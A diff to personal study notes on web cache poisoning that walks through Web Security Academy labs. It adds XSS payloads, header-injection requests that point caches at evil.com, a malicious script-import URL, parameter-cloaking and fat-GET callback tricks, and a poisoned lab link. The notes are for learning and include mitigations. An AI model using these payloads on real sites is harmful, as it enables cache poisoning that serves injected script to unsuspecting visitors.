@@ -3314,14 +3314,81 @@ LLM -> API: create_email_forwarding_rule('peter')
 **Exploiting**
 - exploiting cache design flaws
   - delivering an XSS attack
+    `https://example.com/search?q=<script>alert('XSS')</script>`
   - exploit unsafe handling of resource imports
+    `https://example.com/load.js?url=https://evil.com/malicious.js`
   - exploit cookie-handling vulnerabilities
+    `GET /profile HTTP/1.1 Host: example.com Cookie: sessionId=malicious`
   - using multiple headers
+    ```
+    GET /index.php HTTP/1.1
+    Host: example.com
+    X-Forwarded-Host: evil.com
+    ```
   - responses that expose too much info
+    ```
+    GET /sensitive-info HTTP/1.1
+    Host: example.com
+    ```
   - exploiting DOM-based vulnerabilities
-  - chaining web-cache poisoning vulnerabilities 
+    `https://example.com/search?q=<script>alert('DOM XSS')</script>`
+  - chaining web-cache poisoning vulnerabilities
+    - idenitfy input-based vulnerabilities: XSS, SQL, command injection
+    - exploit the first vulnerabilities via poisoning the cahe: The attacker finds that the website caches search results and is vulnerable to XSS. The attacker sends a request with a malicious payload
+      `https://example.com/search?q=<script>alert('Poisoned Cache')</script>`
+    - exploit the cache implementation flaw: The attacker discovers that the cache key is generated based only on the URL path and ignores the X-Forwarded-Host header.
+      ```
+      GET /search?q=harmless HTTP/1.1
+      Host: example.com
+      X-Forwarded-Host: evil.com
+      ```
 - exploiting cache implementation flaws
-  - key flaws
+  - key flaws (failing to differentiate between HTTP and HTTPS)
+    ```
+    GET /page HTTP/1.1
+    Host: example.com
+    X-Forwarded-Proto: https
+    ```
+  - cache probing methodology
+    - Identify a suitable cache oracle (page or endpoint that provides feedback about the cache's behavior)
+      - cache hit in HTTP header
+      - hanges to dynamic content
+      - Distinct response times
+      ```
+      GET /?param=1 HTTP/1.1
+      Host: innocent-website.com
+      Pragma: akamai-x-get-cache-key
+	
+      HTTP/1.1 200 OK
+      X-Cache-Key: innocent-website.com/?param=1
+      ```
+    - Probe key handling
+      Served our cached response even though the Host header in the request does not specify a port
+      ```
+      GET / HTTP/1.1
+      Host: vulnerable-website.com
+
+      HTTP/1.1 302 Moved Permanently
+      Location: https://vulnerable-website.com/en
+      Cache-Status: miss
+
+      Request 1 with port 1337:
+      GET / HTTP/1.1
+      Host: vulnerable-website.com:1337
+
+      HTTP/1.1 302 Moved Permanently
+      Location: https://vulnerable-website.com:1337/en
+      Cache-Status: miss
+
+      Request 2 without port
+      GET / HTTP/1.1
+      Host: vulnerable-website.com
+
+      HTTP/1.1 302 Moved Permanently
+      Location: https://vulnerable-website.com:1337/en
+      Cache-Status: hit
+      ```
+    - Identify an exploitable gadget: classic client-side vulnerabilities (reflected XSS)
 
 **Mitigation**
 - Include all relevant inputs in the cache key: Ensure that all elements that influence the response (e.g., HTTP headers, query parameters, cookies) are included in the cache key to avoid mixing responses.
@@ -3375,7 +3442,7 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Change the value of the cookie to include an alert prompt and resend the request > confirm the string is reflected in the response
     `fehost=someString"-alert(1)-"someString`
   - Replay the request until you see the payload in the response and X-Cache: hit in the headers. Load the URL in the browser and confirm the alert() fires
-- Web cache poisoning with multiple headers
+- Web cache poisoning with **multiple headers**
   - param miner > guess headers > 
     `x-forwarded-scheme`, `x-forwarded-host`
   - Exploit server
@@ -3513,13 +3580,37 @@ LLM -> API: create_email_forwarding_rule('peter')
     X-Original-Url: /setlang\es
     ```
   - Site auto redirect to spanish version and get the alert prompt
-- dd
-- dd
-- dd
-- dd
-- dd
-- dd
-- dd
+- Web cache poisoning via an **unkeyed query string**
+  - inducing the victim to visit a maliciously crafted URL. This has the potential to impact a far greater number of victims with no further interaction from the attacker.
+    `GET /?evil='/><script>alert(1)</script>`
+  - once your payload is cached, browse the home page
+- Web cache poisoning via an **unkeyed query parameter**
+  - `GET /?utm_content='/><script>alert(1)</script>`
+  - once your payload is cached, browse the home page
+    Response: XXX 
+- **Parameter** cloaking
+  - brute force unkey parameter > "utm_content"
+  - send repeater > GET /js/geolocate.js?callback=setCountryCookie
+    Response: setCountryCookie({"country":"United Kingdom"}
+  - Study the cache behavior. Observe that if you add **duplicate callback parameters**, only the final one is reflected in the response, but both are still keyed
+    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
+    Response: alert(1)({"country":"United Kingdom"}
+- Web cache poisoning via a fat **GET request**
+  - send repeater > GET /js/geolocate.js?callback=setCountryCookie
+    Response: setCountryCookie({"country":"United Kingdom"}
+  - You can control the name of the function in the response by **passing in a duplicate callback parameter via the request body**, only the final one is reflected in the response
+    GET /js/geolocate.js?callback=setCountryCookie
+    
+    `callback=myFunction=alert(1)`
+    Response: alert(1)({"country":"United Kingdom"}
+- **URL normalization**
+  - Poison the page
+    GET %2f<script>alert(1)</script>
+    Response: <p>Not Found: /%3Cscript%3Ealert(1)%3C/script%3E</p>
+  - Deliver the link to victim
+    `https://0a7e007f04ff0a3380a767ec005e001f.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E`
+- **Cache key injection (Expert)**
+- **Internal cache poisoning (Expert)**
 - dd
 - dd
 - dd
